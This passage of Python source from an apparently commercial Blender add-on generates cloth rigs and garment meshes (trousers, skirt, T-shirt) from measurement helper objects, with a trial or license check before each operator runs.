                bpy.context.object.constraints["Limit Rotation"].use_limit_x = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
                AnkleCircle = bpy.data.objects.get("AnkleCircle")
                group_vertices()
                bpy.context.object.show_name = True
                

                
                #Snap Circles to Tape
                select_object("Ankle_Y_TAPE_CIM", deselect=True, cursor_snap=True)
                AnkleCircle.location = bpy.context.scene.cursor.location
                
                select_object("Bicept_Y_TAPE_CIM", deselect=True, cursor_snap=True)
                BiceptCircle.location = bpy.context.scene.cursor.location
                
                select_object("Shoulder_Y_TAPE_CIM", deselect=True, cursor_snap=True)
                ShoulderCircle.location = bpy.context.scene.cursor.location
                
                select_object("Neck_X_TAPE_CIM", deselect=True, cursor_snap=True)
                select_object("Neck_Y_TAPE_CIM", deselect=False, center_cursor=True)
                NeckCircle.location = bpy.context.scene.cursor.location
                
                select_object("Waist_X_TAPE_CIM", deselect=True, cursor_snap=True)
                select_object("Waist_Y_TAPE_CIM", deselect=False, center_cursor=True)
                WaistCircle.location = bpy.context.scene.cursor.location
                
                all_objects = bpy.data.objects
                # Iterate over all objects and delete those whose names contain the specified substring
                for obj in all_objects:
                    if '_TEXT_CIM' in obj.name or '_TAPE_CIM' in obj.name or 'Cloth Rig Factory' in obj.name:
                        bpy.data.objects.remove(obj, do_unlink=True)
                
                #Hide the Circle
                AnkleCircle.hide_viewport = True
                bpy.context.preferences.view.language = safelanguage
                bpy.ops.ed.undo_push(message="Divine Rig")
                return {'FINISHED'}
        



class OBJECT_OT_generate_rig_trousers(bpy.types.Operator):
    bl_idname = "object.generate_rig_trousers"
    bl_label = "Generate Rig Trousers"

    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        safelanguage = bpy.context.preferences.view.language
        bpy.context.preferences.view.language = 'en_US'
        bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
        bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
        bpy.context.scene.tool_settings.vertex_group_weight = 1

        #if(bpy.context.view_layer.objects.active):
        #    Johnny = bpy.context.view_layer.objects.active
        #else:
        #    print("Sorry Charlie, you need to have Johnny Selected")
                
        if(bpy.context.mode != 'OBJECT'):
            bpy.ops.object.mode_set(mode='OBJECT')
        if(bpy.context.scene.character_object):
            #Add Ankle Cuffs
            select_object("Ankle_TEXT_CIM", cursor_snap=True, deselect=True)
            ankle_width = find_size(along_y=True, tape_name="Ankle")
            bpy.ops.mesh.primitive_circle_add(vertices=8, radius=ankle_width)
            bpy.context.active_object.name = 'AnkleCircle'
            bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
            bpy.context.object.constraints["Limit Rotation"].use_limit_x = True
            bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
            bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
            AnkleCircle = bpy.data.objects.get("AnkleCircle")
            group_vertices()
            bpy.context.object.show_name = True
            #move_by(bpy.context.object, mathutils.Vector((0,ankle_width,0)))

            #Add Knee
            select_object("Knee_TEXT_CIM", cursor_snap=True, deselect=True, center_cursor=True)
            knee_width = find_size(along_y=True, tape_name="Knee")
            #print("Ankle : "+str(neck_width))
            bpy.ops.mesh.primitive_circle_add(vertices=8, radius=knee_width*1.2)
            bpy.context.active_object.name = 'KneeCircle'
            bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
            bpy.context.object.constraints["Limit Rotation"].use_limit_x = True
            bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
            bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
            KneeCircle = bpy.data.objects.get("KneeCircle")
            group_vertices()
            bpy.context.object.show_name = True
        
            #Add Thigh
            #find y along the hip
            #add circle where radius is 
            thigh_shift = distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")
            thigh_shift *= 0.5
            select_object("Hip_TEXT_CIM", cursor_snap=True, deselect=True)
            knee_width = find_size(along_y=True,center=False, tape_name="Thigh")
            #print("Ankle : "+str(neck_width))
            bpy.ops.mesh.primitive_circle_add(vertices=8, radius=ankle_width*1.5)
            bpy.context.active_object.name = 'ThighCircle'
            bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
            bpy.context.object.constraints["Limit Rotation"].use_limit_x = True
            bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
            bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
            ThighCircle = bpy.data.objects.get("ThighCircle")
            me = bpy.context.active_object
            move_by(me, mathutils.Vector((0,-thigh_shift,-thigh_shift * 1.125)))
            group_vertices()
            bpy.context.object.show_name = True
            
            

        #Add Groin Z
            select_object("Pelvis_TEXT_CIM", cursor_snap=True, deselect=True)
            Groin_Point = find_size(along_z=True, center=True, tape_name="Groin")
            find_extreme_vertex(bpy.data.objects.get("Groin_Z_TAPE_CIM"), "Z", 'min', delete=True)
            bpy.context.object.name = "GroinPoint"

        
        
        #Add Waistline
            select_object("Pelvis_TEXT_CIM", cursor_snap=True)
            waist_width = find_size(along_x=True, width_factor=(distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2), tape_name="Waist")
            waist_depth = find_size(along_y=True, tape_name="Waist")
            waist_radius = (max(waist_width, waist_depth))*1.5
            if(waist_radius < distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM") or waist_radius > distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2.5):
                waist_radius = distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2.5
                print("waist didnt calculate properly. Just kinda guessed a value. You're welcome")
            bpy.ops.mesh.primitive_circle_add(vertices=16, radius=waist_radius)
            bpy.context.active_object.name = 'WaistCircle'
            bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
            bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
            bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
            bpy.ops.object.constraint_add(type='LIMIT_LOCATION')
            bpy.context.object.constraints["Limit Location"].use_min_x = True
            bpy.context.object.constraints["Limit Location"].use_max_x = True
            WaistCircle = bpy.data.objects.get("WaistCircle")
            group_vertices()
            bpy.context.object.show_name = True
            #spin(WaistCircle, 0.523599, 0)

            
            #Snap Circles to Tape
            select_object("Ankle_Y_TAPE_CIM", deselect=True, cursor_snap=True)
            AnkleCircle.location = bpy.context.scene.cursor.location
            
            select_object("Waist_X_TAPE_CIM", deselect=True, cursor_snap=True)
            select_object("Waist_Y_TAPE_CIM", deselect=False, center_cursor=True)
            WaistCircle.location = bpy.context.scene.cursor.location


            
            
            all_objects = bpy.data.objects
            # Iterate over all objects and delete those whose names contain the specified substring
            for obj in all_objects:
                if '_TEXT_CIM' in obj.name or '_TAPE_CIM' in obj.name or 'Cloth Rig Factory' in obj.name:
                    bpy.data.objects.remove(obj, do_unlink=True)
            
            bpy.context.preferences.view.language = safelanguage
            bpy.ops.ed.undo_push(message="Divine Rig")
        return{'FINISHED'}


class OBJECT_OT_generate_rig_skirt(bpy.types.Operator):
    bl_idname = "object.generate_rig_skirt"
    bl_label = "Generate Rig Skirt"

    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            bpy.context.scene.tool_settings.vertex_group_weight = 1
            
            if(bpy.context.mode != 'OBJECT'):
                bpy.ops.object.mode_set(mode='OBJECT')
            if(bpy.context.scene.character_object):
                select_object("Pelvis_TEXT_CIM", cursor_snap=True)
                waist_width = find_size(along_x=True, width_factor=(distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2), tape_name="Waist")
                waist_depth = find_size(along_y=True, tape_name="Waist")
                waist_radius = (max(waist_width, waist_depth))*1.5
                if(waist_radius < distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM") or waist_radius > distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2.5):
                    waist_radius = distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2.5
                    print("waist didnt calculate properly. Just kinda guessed a value. You're welcome")
                bpy.ops.mesh.primitive_circle_add(vertices=bpy.context.scene.pleat_count, radius=waist_radius)
                bpy.context.active_object.name = 'WaistCircle'
                bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
                bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
                bpy.ops.object.constraint_add(type='LIMIT_LOCATION')
                bpy.context.object.constraints["Limit Location"].use_min_x = True
                bpy.context.object.constraints["Limit Location"].use_max_x = True
                WaistCircle = bpy.data.objects.get("WaistCircle")
                group_vertices()
                bpy.context.object.show_name = True
                
                bpy.ops.mesh.primitive_circle_add(vertices=bpy.context.scene.pleat_count, radius=waist_radius*1.5)
                bpy.context.active_object.name = 'WaistLower'
                bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
                bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
                bpy.ops.object.constraint_add(type='LIMIT_LOCATION')
                bpy.context.object.constraints["Limit Location"].use_min_x = True
                bpy.context.object.constraints["Limit Location"].use_max_x = True
                WaistCircle = bpy.data.objects.get("WaistLower")
                group_vertices()
                bpy.context.object.show_name = True
                bpy.ops.transform.translate(value=(0, 0, waist_radius*-2), orient_type='LOCAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='LOCAL', constraint_axis=(True, True, True), mirror=True, use_proportional_edit=False, proportional_edit_falloff='SMOOTH', proportional_size=0.076278, use_proportional_connected=False, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='MEDIAN', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
                
                
            all_objects = bpy.data.objects
            # Iterate over all objects and delete those whose names contain the specified substring
            for obj in all_objects:
                if '_TEXT_CIM' in obj.name or '_TAPE_CIM' in obj.name or 'Cloth Rig Factory' in obj.name:
                    bpy.data.objects.remove(obj, do_unlink=True)
            
            bpy.context.preferences.view.language = safelanguage
            bpy.ops.ed.undo_push(message="Divine Rig")
            return {'FINISHED'}


#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#
#-----------------------------------------------------  GENERATE CLOTH -----------------------------------------------------#



class OBJECT_OT_generate_top(bpy.types.Operator):
    bl_idname = "object.generate_top"
    bl_label = "Generate Top"

    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = get_blender_module_recent(bpymostrecent)
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            bpy.ops.preferences.addon_enable(module="mesh_looptools")
            #Join all Circle Objects
            AnkleCircle = bpy.data.objects.get("AnkleCircle")
            AnkleCircle.hide_viewport = False
            bpy.context.view_layer.objects.active = bpy.context.scene.character_object
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.select_all(action='DESELECT')
            CircleObjects = ["NipplePoint","AnkleCircle","WaistCircle","ShoulderCircle", "NeckCircle", "BiceptCircle"]
            for name in range(len(CircleObjects)):
                select_object(CircleObjects[name], active=True, deselect=False, cursor_snap=True, center_cursor=False)
                join_objects(bpy.data.objects.get(CircleObjects[name]), bpy.data.objects.get(CircleObjects[name-1]))
            bpy.ops.object.transform_apply(location=True, rotation=True, scale=True)
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.active_object.name = 'Divine_T-Shirt'
            shirt = bpy.context.active_object
            bpy.context.scene.cloth_object = bpy.context.active_object
            
            
            #------------------ STORING WAIST LENGTH (MAX LENGTH) --------------------------
            #Get Length of 31 and 32 (Waist)
            biggest_width = edge_length(30,31)
            #print("Biggest Width = " + str(biggest_width))
            smallest_width = edge_length(0,1)
            #print("Smallest Width = " + str(smallest_width))
            
            
            #------------------ DUPLICATE AND SCALE THE NECK ------------------#
            #Get Neck to Shoulder width Ratio
            neck_center = select_vertices([3,9], deselect=True, get_location=True)
            neck_radius1 = axis_distance(get_vertex_global_coordinates(vertex_index=9), neck_center, axis='X')
            print("Smaller Neck Radius : " + str(neck_radius1))
            neck_radius2 = axis_distance(get_vertex_global_coordinates(vertex_index=15), neck_center, axis='X')
            print("Bigger Neck Radius : " + str(neck_radius2))
            neck_ratio = ((neck_radius2+neck_radius1)/2)/neck_radius1
            
            #Duplicate Neck and Spread
            select_vertices([0], deselect=True)
            for verts in range(12):
                select_vertices([verts])
            bpy.ops.mesh.duplicate_move()
            
            #neck_ratio = (neck_radius2/neck_radius1)
            bpy.ops.transform.resize(value=(neck_ratio, neck_ratio, neck_ratio))
            
            #Transformative Modelling ----------------------------------------------------------------
            #Setting Major Loop
            placement = select_vertices([8,17], deselect=True, get_location=True)
            set_vertex_location_by_index(bpy.context.active_object, 69, placement)
            
            placement = select_vertices([9,16], deselect=True, get_location=True)
            set_vertex_location_by_index(bpy.context.active_object, 70, placement)
            
            placement = select_vertices([10,15], deselect=True, get_location=True)
            set_vertex_location_by_index(bpy.context.active_object, 71, placement)
            
            front_extreme = select_vertices([30], deselect=True, get_location=True)
            neck_front = select_vertices([6], deselect=True, get_location=True)
            placement = select_vertices([6,30], deselect=True, get_location=True)
            placement2 = select_vertices([48], deselect=True, get_location=True)
            placement3 = mathutils.Vector((placement2[0],placement[1],placement2[2]))
            set_vertex_location_by_index(bpy.context.active_object, 48, placement3)
            
            length = edge_length(6, 7)
            select_vertices([67,68], deselect=True)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.transform.translate(value=(0,0,length*-1/2))
            bpy.ops.object.mode_set(mode='OBJECT')
            
            select_vertices([61,72], deselect=True)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.transform.translate(value=(0,0,length*-1))
            bpy.ops.object.mode_set(mode='OBJECT')
            
            select_vertices([71], deselect=True)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.transform.translate(value=(0,length/2,0))
            bpy.ops.object.mode_set(mode='OBJECT')
            
            select_vertices([48], deselect=True)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.transform.translate(value=(length/2,0,length))
            bpy.ops.object.mode_set(mode='OBJECT')
            
            #select_vertices([18,48], deselect=True)
            #join_vertices([18,48])
            select_vertices([6,67], deselect=True)
            join_vertices([6,67])
            join_vertices([7,68])
            join_vertices([8,69])
            join_vertices([9,70])
            join_vertices([10,71])
            join_vertices([11,72])
            join_vertices([0,61])
            
            #Clear Half ---------------------------------------------------
            select_vertices([1,2,3,4,5,25,26,27,28,29,62,63,64,65,66], deselect=True)
            bpy.ops.mesh.delete(type='VERT')
            
            
            #Proceed with Front mesh
            select_vertices([38], deselect=True)
            bpy.ops.object.mode_set(mode='EDIT')
            move((0,length*-0.5, 0))
            bpy.ops.object.mode_set(mode='OBJECT')
            placement1 = select_vertices([38], deselect=True, get_location=True)
            placement2 = select_vertices([53], deselect=True, get_location=True)
            placement3 = select_vertices([52], deselect=True, get_location=True)
            placement4 = mathutils.Vector((placement3[0],placement3[1],placement1[2]))
            placement5 = mathutils.Vector((placement2[0],placement3[1],placement1[2]))
            select_vertices([52,53], deselect=True)
            
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.duplicate_move()
            
            set_vertex_location_by_index(bpy.context.active_object, 58, placement4)
            set_vertex_location_by_index(bpy.context.active_object, 59, placement5)
            
            #Non Destructive Checkpoint -----------------------------------------
            select_vertices([38], deselect=True)
            join_vertices([38,54])
            join_vertices([53,59])
            join_vertices([52,58])
            #join_vertices([13,38])
            
            
            placement1 = select_vertices([13], deselect=True, get_location=True) #Shoulder Forward
            placement2 = select_vertices([38], deselect=True, get_location=True) #nipple
            placement3 = select_vertices([52], deselect=True, get_location=True) #Chest
            placement4 = mathutils.Vector((placement2[0],placement3[1],placement1[2]))
            set_vertex_location_by_index(bpy.context.active_object, 38, placement4)
            
            
            placement1 = select_vertices([20], deselect=True, get_location=True)
            placement2 = select_vertices([58], deselect=True, get_location=True)
            placement3 = mathutils.Vector((placement2[0],placement1[1],placement2[2]))
            set_vertex_location_by_index(bpy.context.active_object, 58, placement3)
            
            select_vertices([38], deselect=True, get_location=True)
            join_vertices([38,59])
            
            placement1 = select_vertices([20], deselect=True, get_location=True)
            placement2 = select_vertices([52], deselect=True, get_location=True)
            placement3 = select_vertices([58], deselect=True, get_location=True)
            placement4 = mathutils.Vector((0, (placement1[1] - (placement1[1] - placement2[1])/2), placement3[2]))
            set_vertex_location_by_index(bpy.context.active_object, 58, placement4)
            
            #move 59 in between 38 and 58
            push = axis_distance(select_vertices([38], deselect=True, get_location=True), select_vertices([58], deselect=True, get_location=True), axis='Y')
            select_vertices([59], deselect=True, get_location=True)
            move((0,-push/2,0))
            
            placement1 = select_vertices([13], deselect=True, get_location=True)
            placement2 = select_vertices([38], deselect=True, get_location=True)
            placement3 = select_vertices([14], deselect=True, get_location=True)
            shift = axis_distance(placement1, placement2, axis='Y')
            print(shift)
            shift2 = axis_distance(placement1, placement3, axis='Z')
            print(shift2)
            
            #Destructive Modelling
            
            select_vertices([38, 59, 58], deselect=True)
            bpy.ops.mesh.duplicate_move()
            print(shift2)
            move((0, (shift/4*-1), (shift2*-1)))
            
            join_vertices([58,61], new=True)
            join_vertices([59,62])
            join_vertices([38,60])
            
            
            bpy.ops.object.mode_set(mode='OBJECT')
            placement1 = select_vertices([13], deselect=True, get_location=True) #mid shoulder
            placement2 = select_vertices([14], deselect=True, get_location=True) #lower Shoulder
            
            placement3 = select_vertices([38,58,59], deselect=True, get_location=True) #lower row
            bpy.ops.object.mode_set(mode='EDIT')
            scale_vertices_around_location(placement1, 0.0, axis='Z')
            
            bpy.ops.object.mode_set(mode='OBJECT')    
            placement4 = select_vertices([60,61,62], deselect=True, get_location=True) #upper row
            bpy.ops.object.mode_set(mode='EDIT')
            scale_vertices_around_location(placement2, 0.0, axis='Z')
            
            length = edge_length(61,62)
            print(int(edge_length(61,20)/length))
            
            placement1 = select_vertices([58,59,38], deselect=True, get_location=True) #upper row
            placement2 = select_vertices([52,53], deselect=True, get_location=True) #lower row
            if(placement1[2] > placement2[2]):
                print("Too high")
                select_vertices([58,59,60,61,62], deselect=True, get_location=True)
                shift = edge_length(52,58)
                move((0, 0, (shift*-1.5)))
                select_vertices([38], deselect=True)
                shift = edge_length(52,58)
                move((0, 0, (shift*-0.75)))
                shift = axis_distance(select_vertices([38], deselect=True, get_location=True), select_vertices([53], deselect=True, get_location=True), axis='Y')
                print(f"Shift : {shift}")
                select_vertices([38], deselect=True)
                move((0, (shift), 0))
            
            #Slice Waist to math
            #placement1 = select_vertices([20], deselect=True)
            #placement2 = select_vertices([21], deselect=True)
            length = edge_length(20,21)
            factor = length/2.74
            select_vertices([21], deselect=True)
            bpy.ops.mesh.bevel(offset=factor, offset_pct=0, affect='VERTICES')
            
            
            select_vertices([13,37], deselect=True)
            join_vertices([13,37], new=True)
            join_vertices([14,59])
            join_vertices([12,53])
            join_vertices([11,54])
            join_vertices([10,55])
            join_vertices([9,56])
            
            placement1 = select_vertices([56], deselect=True, get_location=True)
            placement2 = select_vertices([50], deselect=True, get_location=True)
            placement34 = select_vertices([7], deselect=True, get_location=True)
            placement3 = select_vertices([8], deselect=True, get_location=True)
            placement4 = mathutils.Vector((placement1[0],placement34[1],placement3[2]))
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=64, world_position=placement4)
            select_vertices([64], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            placement5 = mathutils.Vector((placement2[0], placement34[1], placement3[2]))
            set_vertex_location_by_index(vertex_index=65, world_position=placement5)
            
            join_vertices([64,56], new=True)
            join_vertices([65,50])
            
            placement1 = select_vertices([7], deselect=True, get_location=True)
            placement2 = select_vertices([64], deselect=True, get_location=True)
            placement3 = select_vertices([65], deselect=True, get_location=True)
            placement4 = mathutils.Vector((placement3[0], placement1[1], placement1[2]))
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=66, world_position=placement4)
            select_vertices([64], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            placement5 = mathutils.Vector((placement2[0], placement2[1], placement1[2]))
            set_vertex_location_by_index(vertex_index=67, world_position=placement5)
            
            join_vertices([7,67], new=True)
            join_vertices([66,67])
            
            placement1 = select_vertices([18], deselect=True, get_location=True)
            placement2 = select_vertices([67], deselect=True, get_location=True)
            placement3 = select_vertices([66], deselect=True, get_location=True)
            placement4 = mathutils.Vector((placement2[0], placement3[1], placement1[2]))
            select_vertices([18], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=68, world_position=placement4)
            
            placement1 = select_vertices([18], deselect=True, get_location=True)
            placement2 = select_vertices([67], deselect=True, get_location=True)
            placement3 = select_vertices([66], deselect=True, get_location=True)
            placement4 = mathutils.Vector((placement3[0], placement3[1], placement1[2]))
            select_vertices([68], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=69, world_position=placement4)
            
            
            join_vertices([66,69], new=True)
            join_vertices([67,68], new=True)
            
            
            placement1 = select_vertices([7,66,67], deselect=True, get_location=True)
            set_vertex_location_by_index(vertex_index=67, world_position=placement1)
            
            
            
            placement1 = select_vertices([8,64,65], deselect=True, get_location=True)
            set_vertex_location_by_index(vertex_index=64, world_position=placement1)
            
            
            
            
            #Join the armpit
            select_vertices([15,16], deselect=True)
            bpy.ops.mesh.merge(type='CENTER')
            
            length = edge_length(22,23)
            factor = length/2.74
            select_vertices([22], deselect=True)
            bpy.ops.mesh.bevel(offset=factor, offset_pct=0, affect='VERTICES')
            
            #------------------ SAVING VERTICES AND VERTEX GROUPS
            #SAVING LOOPS
            NeckLoop = [0,1,2,3,4,5,6]
            NeckMajorLoop = [48,49,50,51,52,53,54]
            ShoulderLoop = [7,8,9,10,11,12,13,14,15,16,17]
            BiceptLoop = [36,37,38,39,40,41,42,43,44,45,46,47]
            WristLoop = [77,78,79,80,81,82,83,84,85,86,87,88]
            AnkleLoop = [23,24,25,26,27,28,29,30,31,32,33,34]
            WaistLoop = [18,19,20,21,22,60,61,68,69]
            
            #Save vertex groups that will be used early (used below)
            group_vertices(name_of_group="NeckLoop", weight=1, selection=NeckLoop)
            group_vertices(name_of_group="NeckMajorLoop", weight=1, selection=NeckMajorLoop)
            
            #Creating and saving NeckSeamLoop
            select_vertices([0,1,3,5,48,49,51,53], deselect=True)
            bpy.ops.mesh.delete(type='EDGE_FACE')
            select_vertices([2,4,6,50,52,54], deselect=True)
            bpy.ops.mesh.delete(type='EDGE_FACE')
            bridge([49,50,51,52,53,54,48],[1,2,3,4,5,6,0], cuts=2)
            #select_vertices(NeckLoop + NeckMajorLoop, deselect=False, deselect_vertices=True)
            deselect_vertex_group("NeckLoop")
            deselect_vertex_group("NeckMajorLoop")
            NeckSeamLoop = [70,71,72,73,74,75,76]
            #select_vertices(NeckSeamLoop, deselect=True)
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.delete(type='ONLY_FACE')
            #Done. we can join Wrist loop to mesh at this point and group her
            
            #Saving Vertex Groups
            group_vertices(name_of_group="ShoulderLoop", weight=1, selection=ShoulderLoop)
            group_vertices(name_of_group="BiceptLoop", weight=1, selection=BiceptLoop)
            #group_vertices(name_of_group="WristLoop", weight=1, selection=WristLoop)
            group_vertices(name_of_group="AnkleLoop", weight=1, selection=AnkleLoop)
            group_vertices(name_of_group="WaistLoop", weight=1, selection=WaistLoop)
            group_vertices(name_of_group="NeckSeamLoop", weight=1, selection=NeckSeamLoop)
            
            #
            #
            #
            #
            #
            #Unwrapping
            select_vertices([11,4], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            group_vertices(name_of_group="Unwrap", weight=1)
            #------------------ BRIDGING THE CHEST DOWN ------------------# 
            Loop1 = [14,15,16,17,57,58,59,66,67]
            Loop2 = [18,19,20,21,22,60,61,68,69]
            bridge(Loop1, Loop2)
            
            bpy.ops.mesh.delete(type='ONLY_FACE')
            
            select_vertices([45], deselect=True)
            bpy.ops.mesh.dissolve_verts()
            
            
            
            placement1 = select_vertices([44,45], deselect=True, get_location=True)
            scale(placement1, 0.75)
            
            
            #------------------ BRIDGING THE SLEEVE ------------------#
            Loop1 = [7,8,9,10,11,12,13,14,15,16,17]
            Loop2 = [36,37,38,39,40,41,42,43,44,45,46]
            bridge(Loop1, Loop2)
            #select_vertices(Loop1 + Loop2, deselect=False, deselect_vertices=True)
            deselect_vertex_group("ShoulderLoop")
            deselect_vertex_group("BiceptLoop")
            group_vertices(name_of_group="Bicept", weight=0)
            select_vertices(Loop2, deselect=True)
            
            bpy.ops.mesh.select_more()
            deselect_vertex_group(group_name="BiceptLoop")
            #deselect_vertex_group("BiceptLoop")
            #select_vertices(Loop2, deselect=False, deselect_vertices=True)
            
            group_vertices(name_of_group="BiceptCuffs", weight=0)
            select_vertex_group("Bicept")
            select_vertices(Loop1 + Loop2, deselect=False)
            bpy.ops.mesh.delete(type='ONLY_FACE')
            
            #Getting the Cuff Group
            
            
            
            #Clean Entire Mesh
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.fill_holes(sides=4)
            
            #Delete ankle cuffs
            select_vertex_group("AnkleLoop")
            bpy.ops.mesh.delete(type='VERT')
            
            #select_vertices([4,11,39,60], deselect=True)
            #group_vertices(name_of_group="Unwrap", weight=1)
            select_vertex_group("ShoulderLoop")
            replace_weights(group="Unwrap", weight=1)
            select_vertex_group("NeckLoop")
            replace_weights(group="Unwrap", weight=1)
            select_vertices([15,21], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            replace_weights(group="Unwrap", weight=1)
            select_vertices([7,24], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            replace_weights(group="Unwrap", weight=1)
            select_vertices([17,54], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            replace_weights(group="Unwrap", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_linked_pick(deselect=False, delimit={'UV'}, object_index=0, index=0)
            bpy.ops.mesh.select_all(action='DESELECT')
            select_vertex_group("Unwrap", deselect=True)
            bpy.ops.mesh.mark_seam(clear=False)
            
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.uv.unwrap(method='ANGLE_BASED', margin=0.001)
            
            
            
            
            
            
            
            #Finalizing the Groups and Weights
            bpy.ops.mesh.select_all(action='SELECT')
            group_vertices(name_of_group="Pressure", weight=0)
            group_vertices(name_of_group="Pinning", weight=0)
            group_vertices(name_of_group="Shrinking", weight=0.5)
            group_vertices(name_of_group="Smooth", weight=0)
            group_vertices(name_of_group="Shrinkwrap", weight=0)
            group_vertices(name_of_group="PinAndShrink", weight=0)
            bpy.context.scene.tool_settings.vertex_group_weight = 1
            
            select_vertex_group("NeckLoop", deselect=True)
            bpy.ops.mesh.select_more()
            select_vertex_group("Unwrap", deselect=False)
            select_vertex_group("BiceptCuffs", deselect=False)
            deselect_vertex_group(group_name="NeckLoop")
            deselect_vertex_group(group_name="BiceptLoop")
            group_vertices(name_of_group="Seams", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.mark_sharp()
            
            #Ensuring middle verts
            select_vertices([1,19], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            placement = mathutils.Vector((0,0,0))
            scale_vertices_around_location(placement, 0, axis='X')
            select_vertices([0,18], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            scale_vertices_around_location(placement, 0, axis='X')
            
            
            #Sort out Back
            select_vertices([0], deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Shrinkwrap'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Smooth'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.ops.mesh.select_all(action='SELECT')
            
            
            #-------------------------------- FINISH TOP IN OBJECT MODE ------------------------------
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.modifier_add(type='MIRROR')
            bpy.context.object.modifiers["Mirror"].merge_threshold = 0.01
            bpy.ops.object.modifier_add(type='SUBSURF')
